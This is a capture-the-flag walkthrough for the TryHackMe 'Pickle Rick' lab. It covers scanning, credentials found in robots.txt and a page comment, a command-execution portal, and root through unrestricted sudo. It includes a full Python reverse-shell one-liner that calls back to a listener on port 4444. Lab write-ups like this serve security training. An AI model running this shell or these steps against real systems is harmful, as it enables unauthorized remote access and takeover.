# PickleRick 

link to the room: [https://tryhackme.com/room/picklerick]

`export IP=10.10.157.6`


## Recon

### Nmap 

command: `nmap -sC -sV -v -O -oN recon/nmap`

output: 
```
- 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
- 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
```
### Gobuster 

command: `docker run -v /usr/share/dirb/wordlists:/wordlists gobuster dir -u http://$IP -w wordlist/common.txt -x php,txt,html,js,css,cgi,sh,py -t 50`

output
```
/assets               (Status: 301) [Size: 311] [--> http://10.10.157.6/assets/]
/denied.php           (Status: 302) [Size: 0] [--> /login.php]                  
/index.html           (Status: 200) [Size: 1062]                                
/index.html           (Status: 200) [Size: 1062]                                
/login.php            (Status: 200) [Size: 882]                                 
/portal.php           (Status: 302) [Size: 0] [--> /login.php]                  
/robots.txt           (Status: 200) [Size: 17]                 
```

- robots.txt : `Wubbalubbadubdub`
- source page / comment :  `Username: R1ckRul3s`

## TASK

1. What is the first ingredient Rick needs?

- in the `login.php` page we use :
    - username: R1ckRul3s
    - password: Wubbalubbadubdub
- we have access to `portal.php` page we found:  
    - base64 data: `Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==`
    - decoded: `rabbit hole`

- command execution:
    - `ls`
    - `tac Sup3rS3cretPickl3Ingred.txt`

Found first ingredient : mr. meeseek hair

2. Whats the second ingredient Rick needs?

- reverse shell python: 
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.2.243",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
- upgrade shell:
    - `export TERM=xterm`
    - cntrl+z
    - `stty raw -echo`
    - fg & reset

Found second ingredient in `/home/second ingredients`: 1 jerry tear

3. Whats the final ingredient Rick needs?

- `sudo -l` we can run ALL command
- `sudo bash` we are root

Found 3rd ingeredient in `/root/3rd.txt`
